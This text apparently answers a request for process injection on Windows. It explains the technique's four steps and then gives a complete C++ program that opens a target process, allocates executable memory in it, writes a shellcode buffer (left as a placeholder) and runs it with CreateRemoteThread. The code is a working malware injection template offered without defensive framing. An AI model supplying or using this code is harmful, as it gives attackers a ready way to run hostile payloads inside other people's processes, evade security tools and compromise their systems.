Performing process injection typically involves four steps: obtaining a handle to the target process, allocating memory in the target process, writing shellcode to the allocated memory, and creating a remote thread in the target process to execute the shellcode. Here's an example of how the process injection can be implemented in C++:

```cpp
#include <iostream>
#include <Windows.h>

int main()
{
    // Step 1: Obtain handle to target process
    DWORD targetPID = 1234; // PID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        std::cout << "Failed to open target process\n";
        return 1;
    }

    // Step 2: Allocate memory in target process
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuf == NULL) {
        std::cout << "Failed to allocate memory in target process\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Step 3: Write shellcode to allocated memory in target process
    unsigned char shellcode[] = {YOUR_SHELLCODE};
    SIZE_T nBytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteBuf, shellcode, sizeof(shellcode), &nBytesWritten)) {
        std::cout << "Failed to write shellcode to target process\n";
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Step 4: Call CreateRemoteThread to execute the shellcode
    DWORD threadID;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, 0, &threadID);
    if (hThread == nullptr) {
        std::cout << "Failed to create remote thread\n";
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    // cleanup and error handling...
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
